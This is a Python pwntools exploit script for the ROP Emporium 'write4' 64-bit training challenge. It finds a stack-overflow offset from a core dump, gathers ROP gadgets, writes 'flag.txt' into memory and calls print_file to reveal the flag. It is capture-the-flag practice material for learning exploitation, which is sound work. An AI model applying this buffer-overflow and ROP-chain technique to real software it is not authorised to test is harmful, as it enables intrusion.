from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge4/64/write4'

bin= ELF(bin)
context.binary = bin
context.log_level = 'debug'

p= process(bin.path)
p.sendline(cyclic(400, n=8))
p.wait_for_close()
core= p.corefile

leak= core.read(core.rsp, 8)   #read from stack where ret crashed instead of reading eip/rip
offset= cyclic_find(leak, n=8)
print(f"Found offset {offset}")

str1= b"flag.txt"
str= int.from_bytes(str1, "little")
addr= 0x00601068

print= bin.plt['print_file']

ga1= next(bin.search(asm('pop r14; pop r15; ret;')))
ga2= next(bin.search(asm('mov qword ptr [r14], r15; ret; ')))
ga3= next(bin.search(asm('ret;')))
ga4= next(bin.search(asm('pop rdi; ret;')))

chain= flat(b'A'* offset, p64(ga1), p64(addr), p64(str), p64(ga2), p64(ga3), p64(ga4), p64(addr),p64(print))

p2= process(bin.path)
p2.sendline(chain)
p2.interactive()

